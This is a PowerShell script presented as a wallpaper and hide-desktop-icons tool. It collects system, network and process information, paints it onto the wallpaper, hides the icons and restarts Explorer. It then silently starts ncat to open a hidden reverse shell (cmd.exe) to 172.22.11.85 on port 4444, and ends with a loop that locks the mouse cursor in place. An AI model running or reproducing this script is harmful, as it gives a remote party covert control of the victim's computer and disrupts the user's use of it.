# --- WALLPAPER + HIDE DESKTOP ICONS (GitHub-ready) ---

$OutFile  = "$env:USERPROFILE\wallpaper_debug.jpg"
$TempFile = "$env:TEMP\foo.txt"

# Collect system info
try {
    $sysinfo  = systeminfo | Out-String
    $netinfo  = ipconfig /all | Out-String
    $procinfo = Get-Process | Select-Object -First 20 | Out-String

    $data = @"
===== SYSTEM INFO =====
$sysinfo

===== NETWORK INFO =====
$netinfo

===== PROCESSES (first 20) =====
$procinfo
"@

    $data | Out-File -FilePath $TempFile -Encoding UTF8
}
catch {
    "DEBUG MODE: Data collection failed." | Out-File -FilePath $TempFile -Encoding UTF8
}

$content = if (Test-Path $TempFile) { Get-Content $TempFile -Raw } else { "DEBUG MODE: foo.txt missing" }

# Create wallpaper
Add-Type -AssemblyName System.Drawing
[int]$width = 1920
[int]$height = 1080
$bitmap = New-Object System.Drawing.Bitmap $width,$height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)

$brushBg = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(30,144,255))
$graphics.FillRectangle($brushBg,0,0,$width,$height)

$font = New-Object System.Drawing.Font("Consolas",16,[System.Drawing.FontStyle]::Bold)
$brushFg = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
$rect = New-Object System.Drawing.RectangleF(50,50,($width-100),($height-100))
$stringFormat = New-Object System.Drawing.StringFormat
$stringFormat.Alignment = [System.Drawing.StringAlignment]::Near
$stringFormat.LineAlignment = [System.Drawing.StringAlignment]::Near

$graphics.DrawString($content,$font,$brushFg,$rect,$stringFormat)

if (Test-Path $OutFile) { Remove-Item $OutFile -Force }
$bitmap.Save($OutFile,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$graphics.Dispose()
$bitmap.Dispose()

# Set wallpaper
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll",SetLastError=true)]
    public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);
}
"@

[Wallpaper]::SystemParametersInfo(0x0014,0,$OutFile,0x01 -bor 0x02)

# Hide desktop icons and restart Explorer
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
Stop-Process -Name explorer -Force
Start-Process explorer.exe 

#Reverse Shell
Set-Location $env:USERPROFILE
$Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
Start-Process -FilePath $Ncat -ArgumentList "172.22.11.85 4444 -e cmd.exe" -WindowStyle Hidden

<#
mouseblock.ps1
Keeps the mouse locked at its starting position.
Stop with Ctrl+C in this window.
#>

# Import native methods
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class CursorNative {
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT { public int X; public int Y; }
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern bool GetCursorPos(out POINT lpPoint);
}
"@

# Get starting position
[CursorNative+POINT]$start = New-Object CursorNative+POINT
[CursorNative]::GetCursorPos([ref]$start) | Out-Null
$lockX = $start.X
$lockY = $start.Y

Write-Host "Mouse locked at $lockX,$lockY. Press Ctrl+C to stop."

try {
    while ($true) {
        [CursorNative+POINT]$pt = New-Object CursorNative+POINT
        [CursorNative]::GetCursorPos([ref]$pt) | Out-Null

        if ($pt.X -ne $lockX -or $pt.Y -ne $lockY) {
            [CursorNative]::SetCursorPos($lockX, $lockY) | Out-Null
        }

        Start-Sleep -Milliseconds 10
    }
}
finally {
    Write-Host "`nStopped. Cursor can move freely again."
}















